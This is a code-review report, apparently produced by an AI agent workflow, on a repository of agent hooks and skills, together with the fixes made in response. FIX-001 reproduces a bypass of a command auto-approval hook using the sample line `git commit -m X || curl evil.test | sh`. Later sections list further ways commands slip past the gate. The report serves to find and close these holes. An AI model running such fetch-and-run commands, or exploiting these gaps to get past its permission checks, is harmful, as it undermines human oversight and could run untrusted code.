# code-review run: feat/SG-13911-fix-issues-v4-universal-properties @ a779eff

Date: 2026-06-09
Diff scope: `master...HEAD` (88 files, +16,389 / −76)
Layer 1: reviewer-only (codex CLI unavailable — tagged `codex-skipped`), 4 parallel reviewer subagents across 4 angles
Tests: `pytest` 237/237 passing
**Verdict: FIX FIRST** — 1 reproduced P1 (security) + 1 reproduced P2 in shipped code; plus doc/spec inconsistencies.

> **Resolution (2026-06-09, same session):** 14 of 15 findings fixed in the working tree (uncommitted). FIX-014 deferred — see note at bottom. Full suite 239/239 (incl. 2 new regression tests). Re-verified: smart-compose `||` bypass closed; parse-claims parses mixed separators cleanly; edited `.cjs`/`.sh` syntax-checked and run-tested.

---

## Blockers (verified, fix before PR)

### FIX-001 — smart-compose heredoc auto-approves arbitrary command after `||`
**File:** hooks/smart-compose.py:481-487
**Severity:** P1 (security gate fails open)
**Source:** reviewer (shell/python angle) + main-thread reproduction
**Body:** The git-commit-heredoc safe-path splits the pre-`<<` segment on `re.split(r'&&|;', …)` — omitting `||`. A command whose first token is `git commit` passes the prefix regex for the *entire* `||`-joined segment, so the part after `||` is never rule-checked and the whole command is auto-approved.
**Layer 4 (reproduced):** With an empty settings tree (zero allow rules):
- `git commit -m X || curl evil.test | sh <<EOF\n…\nEOF` → returns `"allow"` (BYPASS)
- `git commit -m X && curl … <<EOF` → `None` (correctly passthrough)
- `git commit -m X ; curl … <<EOF` → `None` (correctly passthrough)
Only the `||` form leaks. The earlier dangerous-command-blocker hook still catches `rm -rf`, but non-catastrophic commands (`curl … | sh`, etc.) sail through.
**Suggested fix:** Change line 483 split to `re.split(r'\|\||&&|;', …)` (or reuse `split_on_operators`). 1-line change. Add a regression test mirroring `tests/test_smart_compose.py`.

### FIX-002 — parse-claims silently drops claims on non-em-dash separators
**File:** skills/code-review/scripts/parse-claims.cjs:49
**Severity:** P2 (can cause a false "BOTH CLEAN → PUSH READY")
**Source:** reviewer (node angle) + main-thread reproduction
**Body:** `CLAIM_HEADER` hard-codes a literal U+2014 em-dash separator. Reviewer/Codex output using en-dash (`–`) or hyphen is not recognized and the claim line is silently swallowed into the prior claim's body. A summary containing an inner em-dash also mis-captures the `file` field (non-greedy match stops at the first em-dash).
**Layer 4 (reproduced):** 3-claim input (en-dash / hyphen / inner-em-dash) → only 1 claim parsed, and that one had `file: "inner emdash — /repo/c.ts"`, `summary: "Summary has"` (corrupted). If a reviewer emits en-dashes, *all* its claims vanish and the pipeline reports clean.
**Suggested fix:** Broaden separator to `[—–-]`; anchor the path/line capture to the last separator before `:(\d+)$`. Add `--repo-root` trailing-slash + sibling-prefix guard (line 74) while there.

---

## Documentation / install gaps (verified)

### FIX-003 — smart-compose.py missing from README install (P2)
**File:** README.md:32-34, 139-158
Described in the hooks table (line 75) but absent from the directory tree and the settings.json registration snippet. CLAUDE.md says it MUST be last in the `PreToolUse[Bash]` array; following README alone never registers it. Append it (last) to the snippet and add to the tree.

### FIX-004 — code-review and worklog skills absent from README (P2)
**File:** README.md (Skills/Commands tables + tree)
Both skills + their commands exist on disk but appear nowhere in README. Users can't discover them. Add to tree, Skills table, Commands table.

### FIX-005 — fix-issues SKILL references discover-profile.cjs which was never shipped (P2)
**File:** skills/fix-issues/SKILL.md:337, skills/fix-issues/project-setup/templates/PROJECT_PROFILE.md:394
Script does not exist (only check-fix-gate.cjs, merge-fix-session.cjs). A documented subagent fallback (SKILL.md:338-345) covers it, so not a hard failure — but the dead `node …discover-profile.cjs` line pollutes the transcript with a "module not found" error. Remove the script line, keep the subagent fallback.

### FIX-006 — fix-issues Gate 1/2 procedure contradicts Critical Reminders (P2)
**File:** skills/fix-issues/SKILL.md:516, 668 vs 1112
Gate 1/2 procedures: "Run the gate-check script via Bash … MANDATORY — hook output alone is NOT sufficient." Critical Reminders #9: "GATE 1/2: hook auto-validates on Edit" (implies no script run for 1/2). An agent trusting the summary skips a mandatory step. Reconcile #9 to match the per-gate procedure.

---

## Lower severity (verified, optional)

- **FIX-007 (P3)** session-notes/SKILL.md missing `name:` frontmatter — only skill without it (cross-validated). Currently resolves from directory name, so functional, but inconsistent with the other 9 skills + CLAUDE.md convention. — skills/session-notes/SKILL.md:1
- **FIX-008 (P3)** Duplicate step number `6.` in Phase 4.1 (run-validators / compose-verdict). Renumber the second to `7.` — skills/fix-issues/SKILL.md:715,722
- **FIX-009 (P3)** CLAUDE.md says "27 trusted builtins"; actual `TRUSTED_BUILTINS` = 28 (prose already lists 28 names). — CLAUDE.md:50
- **FIX-010 (P3)** SETUP/README stale counts & versions: code-review SETUP "Three helper scripts" (4 exist); fix-issues SETUP "v3.1.13 ~600 lines" (actual v3.1.14 / 1112 lines); README tree "v3.1.13". — skills/code-review/SETUP.md:18, skills/fix-issues/SETUP.md:16, README.md:10
- **FIX-011 (P3)** detect-security-relevant.sh: unescaped JSON interpolation (filenames with `"`), and two-dot `..` vs three-dot `...` diff base. — skills/code-review/scripts/detect-security-relevant.sh:42,26
- **FIX-012 (P3)** check-fix-gate.cjs: per-property verdict table not parsed when headers are bold (`**Property**`); alignment-colon separator rows (`| :---: |`) treated as data. — skills/fix-issues/project-setup/scripts/check-fix-gate.cjs:145,270
- **FIX-013 (P3)** gate-check-hook.sh line 98 `jq` invocation lacks `|| true`; on a machine without jq the ERR trap exits non-zero, violating the always-exit-0 hook protocol. — skills/fix-issues/project-setup/hooks/gate-check-hook.sh:98
- **FIX-014 (P3)** session-checkpoint.py branch sanitization `replace("/","-")` collides `feat/foo` ↔ `feat-foo`. — hooks/session-checkpoint.py:43
- **FIX-015 (P3)** fix-issues SKILL references `/test-audit` (no such skill/command) and a dangling "Capability Boundary, Chunk 3" anchor. — skills/fix-issues/SKILL.md:25,728

---

## Dropped at Layer 2 / not blocking
- "code-review lacks setup.sh" — CLAUDE.md prescribes setup.sh for runtime-dep skills, but code-review intentionally uses a manual per-project hook install (SETUP.md documents it). Doc-policy choice, not a defect.
- Symlink base-path differences between README and SETUP — both say "adjust path"; cosmetic.

---

## FIX-014 — DEFERRED (not applied)

**File:** hooks/session-checkpoint.py:43 — `branch.replace("/", "-")`
**Why deferred:** The `/`→`-` sanitization is a *shared convention* documented in CLAUDE.md and relied on by squash-commits, session-notes, and this hook to compute the SAME `.claude/sessions/{sanitized-branch}/` path. Changing it in the hook alone would make the gate look for the marker at a different path than session-persist writes it to — turning a negligible collision (requires sibling branches `feat/foo` AND `feat-foo`) into a guaranteed marker-handshake break. A correct fix is a reversible encoding (e.g. percent-encode `/` as `%2F`) applied atomically across all producers/consumers + the CLAUDE.md convention. Out of family for this PR.

---

## Deep P3 pass (same session) — outcome

A second, P3-focused fan-out (5 parallel deep reviewers) surfaced ~30 further issues,
several **above P3**. Resolution (committed in 6 batches; suite 242/242):

**Escalations fixed (were above P3):**
- smart-compose: 3 more confirmed fail-open *correctness* bypasses fixed + tested —
  env-prefix `VAR=val cmd`, `$()` in the git-commit heredoc safe-path, and an ANSI-C
  `$'...'` quote-parse bug in `_find_matching_close`.
- fix-issues v4 gate↔template mismatch fixed — `FIX_ISSUE.md` §2.5 (Universal Properties
  P1–P13) + §4 (per-property verdict table + composed verdict) + the Phase 4.1 checkpoint
  now match what Gate 3 parses (verified via the gate's own `parseIssueFile`).

**P2/P3 fixed:** check-fix-gate parsing (code-fence section truncation, `**STANDARD**`
fail-open, `2.6`/`2.6.1` subsection prefix-match, mid-table row drops, formatOutput
gate/fixId); code-review pipeline (worktree `--git-common-dir`, `origin/main` fallback,
prompt three-dot diff, gate env-prefix regex, parse-claims clean exit 0, stale-marker
cleanup, `{{VARIABLE}}` substitution note); install plumbing (unbound `$2`, idempotent
merge, single-quote-path injection via env-vars, narrowed uninstall, session-checkpoint
repo-root marker + git timeout, `.gitignore`); terminology + doc consistency (Agent tool,
SESSION.md, chore row, jq prereq, design-doc status, baseline README).

**Deliberately NOT changed (flagged):**
- **smart-compose trusted-builtin / redirect policy** — `awk`/`sed`/`cp`/`tee` as trusted
  builtins and shell redirections (`>`, `>>`) through builtins still auto-approve. These are
  policy decisions (per user direction), not changed unasked. Recommend a follow-up decision:
  demote `awk`/`sed` from `TRUSTED_BUILTINS` and add a redirect guard.
- **FIX-014 sanitized-branch collision** — still deferred (cross-cutting reversible-encoding
  change across 4 files + CLAUDE.md; risk > impact for a sibling-branch-only collision).
- **check-fix-gate composed-verdict last-match (3e)** — strict-direction only (cannot
  false-pass); left as-is.
- **GATE-PASSED line-anchoring (3g)** — anchoring risks failing to detect legitimately-placed
  markers (fail-closed regression); no trigger text in the shipped template. Left as-is.
- **pyproject pythonpath (5g)** — false positive: `conftest.py` resolves the hook via a
  `__file__`-relative path, so it is already invocation-directory-independent.

---

## Follow-up (same session) — deferred items resolved

At user request, the items previously left deferred were addressed and verified:
- **FIX-014** — sanitized-branch now uses reversible `%2F` encoding across all 5 sites
  (hook + 3 skills + CLAUDE.md); sed and python encodings confirmed identical.
- **3e** — `extractComposedVerdict` anchored to a declaration line (prose mention can no
  longer override; later-line upgrade still wins).
- **3g** — GATE-N-PASSED checks anchored to line-start with markdown prefixes allowed
  (bold/blockquote/list/heading accepted; table-cell + inline prose rejected).
- **5g** — explicit `pythonpath = ["."]` added (belt-and-suspenders; conftest already
  resolved via `__file__`).

The only item now intentionally left unchanged is the **smart-compose trusted-builtin /
redirect policy** (awk/sed/cp/tee + shell redirections), which remains a policy decision
flagged for the user.
